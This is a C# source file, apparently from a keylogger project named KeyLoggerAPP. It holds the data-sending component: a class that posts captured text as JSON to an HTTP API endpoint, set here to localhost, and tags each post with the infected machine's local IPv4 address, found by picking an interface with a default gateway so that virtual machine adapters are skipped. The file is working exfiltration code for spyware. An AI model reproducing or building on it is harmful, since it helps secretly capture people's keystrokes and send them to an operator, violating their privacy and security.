using System;
using System.Linq;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace KeyLoggerAPP
{
    public class ServiceHTTP
    {
        public async static Task<bool> SendDataAsync(string text)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("X-ORIGIN", GetIp());
                var response = await httpClient.PostAsync("http://localhost:80/api/", new StringContent(JsonSerializer.Serialize(text), Encoding.UTF8, "application/json"));

                return response.IsSuccessStatusCode;
            }
            catch
            { }

            return false;
        }

        private static string GetIp()
        {
            try
            {
                return Array.FindAll(NetworkInterface.GetAllNetworkInterfaces(), netInt =>

                //Verifica se existe gateway padrão, para ignorar o ip caso exista uma vm na máquina
                netInt.GetIPProperties().GatewayAddresses.Any() &&
                (netInt.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || netInt.NetworkInterfaceType == NetworkInterfaceType.Ethernet))
                [0].GetIPProperties().UnicastAddresses.Select(x => x.Address).FirstOrDefault(x => x.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork).ToString();
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
    }
}
